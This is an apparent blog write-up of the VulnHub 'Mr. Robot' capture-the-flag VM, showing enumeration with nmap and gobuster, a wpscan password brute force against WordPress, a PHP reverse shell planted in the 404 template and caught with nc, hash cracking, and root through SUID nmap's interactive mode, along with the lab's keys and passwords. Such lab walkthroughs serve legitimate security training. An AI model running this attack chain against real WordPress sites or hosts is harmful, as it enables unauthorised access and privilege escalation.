---
title: "VulnHub | Mr. Robot - Writeup"
excerpt: Writeup for Mr. Robot from VulnHub
date: 2019-07-04 00:00:00
categories: [VulnHub]
---

## Information
Mr. Robot is a simple-intermediate level box on VulnHub that is based on the popular TV series of the same name. 

Mr. Robot has 3 keys to capture and the aims to make the pentester gain control over a Wordpress installation, use it 
to establish a reverse shell, and then escalate privileges to `root` using vulnerable programs installed in the system.

## Tasks
- Capture all 3 keys
 
## Summary
- Use `nmap` to see the services
- Use `gobuster` to find the hidden web directories and capture `key-1-of-3.txt`
- Use `wpscan` to find possible vulnerabilities in the Wordpress installation and brute-force login
- Implement a reverse shell in one of the pages via `Editor` and use `nc` to catch the reverse shell
- Crack the MD5 via `hashcat` and to spawn a shell with `python` to login as `robot` to capture `key-2-of-3.txt`
- Find possible vulnerabilities in the shell via `LinEnum` to escalate privileges to `root` and capture`key-3-of-3.txt`
 
## Walkthrough
### nmap
We first begin with a standard `nmap` scan to see the services and what we're dealing with.

```
$ nmap -sC -sV 192.168.2.243
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

We have 3 services running, most notably `HTTP` on Port 80.

### HTTP
Taking a look at the `HTTP` by visiting `192.168.2.243` reveals an animated terminal and a message from Mr. Robot.

![Mr. Robot][Mr. Robot]

There are some commands we can input but none of them reveal anything useful to help us capture our first key. As a 
result enumerating the directories with `gobuster` is the next step. Do note that `directory-list-2.3-medium.txt` was 
copied from `/usr/share/wordlists/dirbuster/`.

```
$ gobuster dir -u 192.168.2.243 -w directory-list-2.3-medium.txt
=====================================================
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
/%!(NOVERB) (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 403)
/0000 (Status: 301)
/IMAGE (Status: 301)
/wp-signup (Status: 302)
/KeithRankin%!(NOVERB) (Status: 301)
/kaspersky%!(NOVERB) (Status: 301)
/page01 (Status: 301)
/Cirque%!d(MISSING)u%!s(MISSING)oleil%!(NOVERB) (Status: 301)
=====================================================
2019/07/02 15:54:29 Finished
=====================================================
```

We now know that the website has a Wordpress installation and there are several interesting directories, most notably 
`/robots`; which displays a raw paste that reveals two other hidden directories.

![robots.txt][robots.txt]

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Visiting `fsocity.dic` allows us to download a dictionary file that we'll probably use later. Visiting `key-1-of-3.txt` 
grants us our first key; `073403c8a58a1f80d943455fb30724b9`.

### Wordpress
Since we know Wordpress is present on this machine, we'll try to access the admin console over at `/wp-admin`. Since 
we don't know the credentials of the users on this machine, we'll use `Lost Your Password?` and try various usernames 
related to the TV show to see if anything matches. `admin`,` fsociety` and `mrrobot` prompted "Invalid username or 
e-mail" while `elliot` was a match; prompting "The e-mail could not be sent. Possible reason: your host may have 
disabled the mail() function", telling us that `elliot` is a user in the system. 

Using `wpscan` we can brute-force the Wordpress installation to login as `elliot` using the `fsocity.dic` as our 
wordlist.

```
$ wpscan --url 192.168.2.243 --passwords fsocity.dic --usernames elliot

[...]

[i] Valid Combinations Found:
| Username: elliot, Password: ER28-0652

[...]
```

`wpscan` found `elliot`'s password to be `ER28-0652`. We can now access `/wp-admin`.

![Wordpress - Panel][Wordpress - Panel]

Checking the panel there is nothing of interest aside images in `Media` and 2 users in `Users` where we only see 
`elliot` and `mich05654` who's name is Krista Gordon; Elliot's shrink in the TV series. 

![Wordpress - Users][Wordpress - Users]

### Getting a Reverse Shell Via Wordpress
To get a reverse shell we'll use `PHP Reverse Shell` script by [pentestmoney][pentestmonkey]{:target="_blank"}. When 
attempted to upload to Wordpress we're not permitted to upload it.

![Wordpress - Denied][Wordpress - Denied]

As a result, we must attempt another way to upload our script. Luckily we can access `Appearance/Editor` and edit 
webpages of our choosing. Pasting the script to `404 Template` will suffice as the shell will initiate once we load 
`http://192.168.2.243/404.php`.

![Wordpress - 404][Wordpress - 404]

```
$ curl http://192.168.2.243/404.php

$ nc -lvnp 7500
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off

$ cd /home

$ ls -la
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot

$ cd /home/robot

$ ls -la
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied

$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We got access to the machine and navigating to `/home/robot` revealed 2 files; `key-2-of-3.txt` and `password.md5-raw`. 
Attempting to read `key-2-of-3.txt` doesn't work as we need to login as `robot`. To do that we must crack `robot`'s 
password, which is stored as a `MD5` hash in `password.raw-md5`.

### Logging in as Robot
We know our hash is `MD5` so using `hashcat` with `rockyou.txt` from `/usr/share/wordlists/rockyou.txt` we can 
commence a dictionary attack to crack it. Do note that `rockyou.txt` was copied from `/usr/share/wordlists/rockyou.txt`.

```
$ hashcat -m 0 -a 0 -d 1 --force hash.txt rockyou.txt
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Now using `python` we can spawn a proper shell and switch users with the password we found.
Now let's attempt to switch users in the shell with our password. But in order to do that we need to spawn a proper 
shell with `python`.

```
$ python -c 'import pty; pty.spawn("/bin/sh")'

$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

### Escalating Privileges to Root
Using `LinEnum`, we can scan for possible vulnerabilities in the system that may aide us on escalating our privileges 
to `root` so we can access `/root`.

```
$ cd /tmp

$ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

$ chmod +x LinEnum.sh

$ ./LinEnum.sh
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################

[...]

### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/local/bin/nmap
/usr/bin/gcc
/usr/bin/curl

[...]

[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap

[...]
```

`LinEnum` found an interesting `SUID` regarding `nmap`. Checking its version; `3.81`, is a version that is known to 
be vulnerable to a certain privilege escalation attacking using `--interactive`.

```
$ nmap --version
Nmap version 3.81 ( https://nmap.org )

$ nmap --interactive
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh

# whoami
root

# cd /root

# ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd

# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Thus we've captured our third and final key.

[Mr. Robot]:            /images/2019-07-04-vulnhub-mr_robot/Mr.%20Robot.png
[robots.txt]:           /images/2019-07-04-vulnhub-mr_robot/Robots.png
[Wordpress - Panel]:    /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Panel.png
[Wordpress - Users]:    /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Users.png
[pentestmonkey]:        http://pentestmonkey.net/
[Wordpress - Denied]:   /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Denied.png
[Wordpress - 404]:      /images/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20404%20Template.png